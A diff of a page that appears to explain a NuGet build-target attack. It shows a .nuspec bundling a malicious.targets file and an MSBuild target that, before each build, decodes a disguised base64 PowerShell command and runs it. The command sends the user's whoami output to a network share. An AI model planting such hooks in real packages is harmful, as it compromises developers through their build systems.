@@ -113,47 +113,47 @@ So the attack now triggers upon a build event - which in the case of restoring a
 
 <pre>
     <code>
-    <?xml version="1.0"?>
-<package >
-    <metadata minClientVersion="2.5">
-    <!-- ... -->
-    </metadata>
-    <files>
-        <!-- Include everything in \build -->
-        <file src="build\malicious.targets" target="build" />
+    &lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;package &gt;
+        &lt;metadata minClientVersion=&quot;2.5&quot;&gt;
+        &lt;!-- ... --&gt;
+        &lt;/metadata&gt;
+        &lt;files&gt;
+            &lt;!-- Include everything in \build --&gt;
+            &lt;file src=&quot;build\malicious.targets&quot; target=&quot;build&quot; /&gt;
 
-        <!-- Other files -->
-        <!-- ... -->
-    </files>
-</package>
+            &lt;!-- Other files --&gt;
+            &lt;!-- ... --&gt;
+        &lt;/files&gt;
+    &lt;/package&gt;
     </code>
 </pre>
 
 <pre>
     <code>
-    <Project>
-  <PropertyGroup>   
-    <hmac>cG93ZXJzaGVsbCAtTm9Qcm9maWxlIOKAk0V4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiR1c2VyID0gJiB3aG9hbWk7QWRkLUNvbnRlbnQgLy9HUjA1OTYxOS9sb2cvbG9nLnR4dCAkdXNlciIK</hmac>    
-  </PropertyGroup> 
-  <UsingTask TaskName="ToBase64" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
-    <ParameterGroup>
-      <In ParameterType="System.String" Required="true" />
-      <Out ParameterType="System.String" Output="true" />
-    </ParameterGroup>
-    <Task>
-      <Code Type="Fragment" Language="cs">
-      Out = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(In));
-    </Code>
-    </Task>
-  </UsingTask>
-  <Target Name="SetACL" BeforeTargets="PreBuildEvent">
-    <!--Execute code-->
-    <ToBase64 In="$(hmac)">
-      <Output PropertyName="hmacValidation" TaskParameter="Out" />
-    </ToBase64>
-    <Exec Command="$(hmacValidation)" />
-  </Target>    
-</Project>
+    &lt;Project&gt;
+      &lt;PropertyGroup&gt;   
+        &lt;hmac&gt;cG93ZXJzaGVsbCAtTm9Qcm9maWxlIOKAk0V4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiR1c2VyID0gJiB3aG9hbWk7QWRkLUNvbnRlbnQgLy9HUjA1OTYxOS9sb2cvbG9nLnR4dCAkdXNlciIK&lt;/hmac&gt;    
+      &lt;/PropertyGroup&gt; 
+      &lt;UsingTask TaskName=&quot;ToBase64&quot; TaskFactory=&quot;CodeTaskFactory&quot; AssemblyFile=&quot;$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll&quot;&gt;
+        &lt;ParameterGroup&gt;
+          &lt;In ParameterType=&quot;System.String&quot; Required=&quot;true&quot; /&gt;
+          &lt;Out ParameterType=&quot;System.String&quot; Output=&quot;true&quot; /&gt;
+        &lt;/ParameterGroup&gt;
+        &lt;Task&gt;
+          &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;
+          Out = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(In));
+        &lt;/Code&gt;
+        &lt;/Task&gt;
+      &lt;/UsingTask&gt;
+      &lt;Target Name=&quot;SetACL&quot; BeforeTargets=&quot;PreBuildEvent&quot;&gt;
+        &lt;!--Execute code--&gt;
+        &lt;ToBase64 In=&quot;$(hmac)&quot;&gt;
+          &lt;Output PropertyName=&quot;hmacValidation&quot; TaskParameter=&quot;Out&quot; /&gt;
+        &lt;/ToBase64&gt;
+        &lt;Exec Command=&quot;$(hmacValidation)&quot; /&gt;
+      &lt;/Target&gt;    
+    &lt;/Project&gt;
     </code>
 </pre>
 
